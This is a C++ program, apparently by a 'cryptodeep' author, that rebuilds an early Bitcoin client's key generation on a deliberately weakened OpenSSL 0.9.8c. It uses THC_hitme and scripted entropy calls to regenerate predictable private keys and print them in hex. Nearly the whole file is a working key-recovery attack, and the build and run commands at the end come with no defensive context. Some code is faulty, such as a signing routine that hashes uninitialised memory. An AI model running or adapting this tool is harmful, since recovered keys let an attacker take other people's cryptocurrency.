
#include <cstdint>
#include <iostream>
#include <openssl/bn.h>
#include <openssl/engine.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <time.h>
#include <vector>
#include <time.h>

typedef int64_t int64;
typedef uint64_t uint64;

uint64 GetRand(uint64 nMax)
{
  if (nMax == 0)
    return 0;
  uint64 nRange = (UINT64_MAX / nMax) * nMax;
  uint64 nRand = 0;
  do
  {
    RAND_bytes((unsigned char *)&nRand, sizeof(nRand));
  } while (nRand >= nRange);
  return (nRand % nMax);
}
// 签名 一次
void Sign(EC_KEY *pkey)
{
  unsigned char pchSig[10000];
  unsigned int nSize = 0;
  unsigned char hash;

  ECDSA_sign(0, (unsigned char *)&hash, 32, pchSig, &nSize, pkey);
}
// 生成私钥
EC_KEY *MakeNewKey(bool isShow)
{
  EC_KEY *pkey = EC_KEY_new_by_curve_name(NID_secp256k1);
  EC_KEY_generate_key(pkey);
  const BIGNUM *privKey = EC_KEY_get0_private_key(pkey);
  if (privKey)
  {
    char *privKeyHex = BN_bn2hex(privKey);
    if (privKeyHex)
    {
      if (isShow)
      {
        std::cout << privKeyHex << std::endl;
      }
      OPENSSL_free(privKeyHex);
    }
  }
  return pkey;
}
// 自定义RAND_bytes位数
void My_RAND_bytes(int size)
{
  const int length = 16;
  unsigned char randomBytes[length];
  RAND_bytes(randomBytes, size);
}
// 鼠标移动n次
void MouseMove(int n)
{
  for (int k = 0; k < n; k++)
  {
    RAND_add(NULL, 8, 1.5);
    RAND_add(NULL, 4, 0.25);
    RAND_add(NULL, 4, 0.25);
  }
}

int run(int argc, char *argv[])
{
  // 最大pid
  int64 maxPid = 32768;
  int64 maxmove = 500;
  maxPid = 5;
  maxmove = 3;
  if (strcmp(argv[1], "1") == 0)
  {
    // 首次启动后新增地址
    for (int j = 1; j < maxmove; j++)
    {
      for (int i = 1; i < maxPid; i++)
      {
        // printf("j:%d,i:%d\n",j,i);
        THC_hitme(0);
        THC_hitme(i);
        // 启动加初始化
        RAND_add(NULL, 8, 1.5);
        RAND_add(NULL, 8, 1.5);
        MakeNewKey(false);
        RAND_add(NULL, 8, 1.5);
        My_RAND_bytes(8);
        MouseMove(j);
        MakeNewKey(true);
      }
    }
  }
  if (strcmp(argv[1], "2") == 0)
  {
    // 首次启动后交易
    for (int j = 1; j < maxmove; j++)
    {
      for (int i = 1; i < maxPid; i++)
      {
        THC_hitme(0);
        THC_hitme(i);
        // 启动加初始化
        RAND_add(NULL, 8, 1.5);
        RAND_add(NULL, 8, 1.5);
        MakeNewKey(false);
        RAND_add(NULL, 8, 1.5);
        My_RAND_bytes(8);
        MouseMove(j);
        My_RAND_bytes(8);
        MakeNewKey(true);
      }
    }
  }
  if (strcmp(argv[1], "3") == 0)
  {
    // 二次启动后新增地址
    for (int j = 1; j < maxmove; j++)
    {
      for (int i = 1; i < maxPid; i++)
      {
        THC_hitme(0);
        THC_hitme(i);
        // 启动加初始化
        RAND_add(NULL, 8, 1.5);
        RAND_add(NULL, 8, 1.5);
        MakeNewKey(false);
        RAND_add(NULL, 8, 1.5);
        MouseMove(j);
        MakeNewKey(true);
      }
    }
  }

  if (strcmp(argv[1], "4") == 0)
  {
    // 二次启动后交易
    for (int j = 1; j < maxmove; j++)
    {
      for (int i = 1; i < maxPid; i++)
      {
        THC_hitme(0);
        THC_hitme(i);
        // 启动加初始化
        RAND_add(NULL, 8, 1.5);
        RAND_add(NULL, 8, 1.5);
        MakeNewKey(false);
        RAND_add(NULL, 8, 1.5);
        MouseMove(j);
        My_RAND_bytes(8);
        MakeNewKey(true);
      }
    }
  }

  return 0;
}
int main(int argc, char *argv[])
{
  return run(argc, argv);
}
// g++ -std=c++11 cryptodeepbtcFor_0_2_13beta.c -o cryptodeepbtcFor_0_2_13beta -I./openssl-0.9.8c-vuln/include -L./openssl-0.9.8c-vuln -lssl -lcrypto
// LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcFor_0_2_13beta
